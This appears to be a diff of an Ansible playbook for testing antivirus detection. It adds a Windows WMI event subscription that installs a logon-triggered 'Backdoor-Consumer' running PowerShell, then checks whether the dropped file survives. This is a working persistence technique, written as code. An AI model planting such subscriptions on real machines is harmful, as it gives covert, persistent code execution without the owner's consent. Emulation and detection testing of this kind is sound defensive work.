@@ -4,7 +4,7 @@
   vars_files:
    - /opt/ansible/vars.yaml
   tasks:
-        - name:
+        - name: Create WMI Event subscription
           tags: always
           win_shell: |
             # Create Filter - User logging in
@@ -15,7 +15,7 @@
               QueryLanguage = 'WQL'
             }
             # Configure Consumer with Command line
-            $Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value texttext"
+            $Command = 'powershell.exe -Command Set-Content -Path C:\temp\"{{ victim_file }}" -Value "{{ exfiltration_data }}"'
             $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
               Name = "Backdoor-Consumer"
               CommandLineTemplate = $Command }
@@ -23,8 +23,19 @@
             Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{
               Filter = $Filter
               Consumer = $Consumer}
-            
-            
+              
+        - name: sleep for 10 seconds and continue with play to check if AV removed or Not
+          tags: always
+          wait_for: timeout=10
+          delegate_to: localhost
+          
+        - name: Check if startup file exist exist
+          tags: always
+          win_stat:
+            path: C:\temp\"{{ victim_file }}"
+          register: T1084
+          
+          
             #$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'Backdoor-Consumer'"
             #$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'Backdoor-Logon-Filter'"
             #$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"
